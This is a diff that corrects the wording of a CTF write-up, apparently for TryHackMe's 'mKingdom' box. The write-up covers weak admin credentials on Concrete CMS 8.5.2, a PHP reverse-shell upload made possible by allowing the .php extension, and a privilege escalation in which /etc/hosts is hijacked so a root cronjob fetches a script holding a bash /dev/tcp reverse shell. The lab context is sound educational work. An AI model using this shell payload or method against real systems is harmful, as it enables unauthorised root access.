@@ -12,8 +12,8 @@ mermaid: true
 
 # Summary
 
-> - Weak Credential in admin portal.
-> - Hidden Creds in backup file and enviroment.  
+> - Weak credentials in the admin portal.
+> - Hidden Creds in the backup file and environment.  
 
 ## NMAP
 
@@ -28,24 +28,24 @@ PORT   STATE SERVICE REASON  VERSION
 
 ## Web Enumeration
 
-In homepage, nothing intertging.  
+On the homepage, nothing interesting.  
 FUZZ directory with `ffuf`, we found `/app`.  
 ![](/commons/THM/mKingdom/0_app.png)  
 
 Looking on `/app`.  
-App is using `Concrete CMS 8.5.2`.  
-Quick search about `Concrete CMS 8.5.2`.  
+The app is using `Concrete CMS 8.5.2`.  
+A quick search about `Concrete CMS 8.5.2`.  
 ![](/commons/THM/mKingdom/1_CMS.png)
 
-After read `Document`, we found login page url.  
+After reading `Document`, we found the login page URL.  
 ![](/commons/THM/mKingdom/2_login.png)  
 
-`Weak credential`. Login in to `dashboard` with weak credential.  
+`Weak credential`. Log in to `dashboard` with weak credentials.  
 
-After check some functions in admin dashboard.
-We can upload file to system. `File upload` vuln is first thing in my mind.  
-After check some technique to by pass system, no luck.  
-Continuous check other setting, we can add file `extensions` allow.  
+After checking some functions in the admin dashboard.
+We can upload files to the system. `File upload` vuln is the first thing on my mind.  
+After checking some techniques to bypass the system, cannot bypass it.  
+Continuous check other settings, we can add file `extensions`.  
 Add `.php` and upload a `php reverse shell`.  
 ![](/commons/THM/mKingdom/3_extensions.png)  
 
@@ -53,7 +53,7 @@ Add `.php` and upload a `php reverse shell`.
 
 ![](/commons/THM/mKingdom/5_shell.png)  
 
-Spawn a tty shell with python.  
+Spawn a tty shell with Python.  
 
 ```text
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -63,10 +63,10 @@ stty raw -echo; fg
 ```
 
 [linpeas.sh](https://github.com/peass-ng/PEASS-ng). I've mentioned it many times, it's one of my favorite tools for finding ways to escalate privileges.  
-Found interting `password`  
+Found interesting `password`  
 ![](/commons/THM/mKingdom/6_toad.png)  
 
-Change user and run `linpeas.sh` again.  
+Change the user and run `linpeas.sh` again.  
 
 ![](/commons/THM/mKingdom/7_mario.png)  
 
@@ -74,7 +74,7 @@ Change user and run `linpeas.sh` again.
 
 ## Privilege Escalation
 
-Countinuing run `linpeas.sh`. we discovered a bunch of interesting things but none of them were usable.  
+Continuing run `linpeas.sh`. we discovered a bunch of interesting things but none of them were usable.  
 ![](/commons/THM/mKingdom/8_hosts.png)  
 
 After deep enumeration, check cronjob with [pspy](https://github.com/DominicBreuker/pspy)  
@@ -82,14 +82,14 @@ After deep enumeration, check cronjob with [pspy](https://github.com/DominicBreu
 ![](/commons/THM/mKingdom/9_curl.png)  
 
 Lookback, we can edit `/etc/hosts`.  
-Creat a `/app/castle/application/counter.sh` in localhost.
+Create a `/app/castle/application/counter.sh` in localhost.
 
 ```shell
 #!/bin/bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 
-And run http server on port 85.
+And run the HTTP server on port 85.
 Change `/etc/hosts` with `localIP mkingdom.thm` and  
 ![](/commons/THM/mKingdom//10_root.png)
 
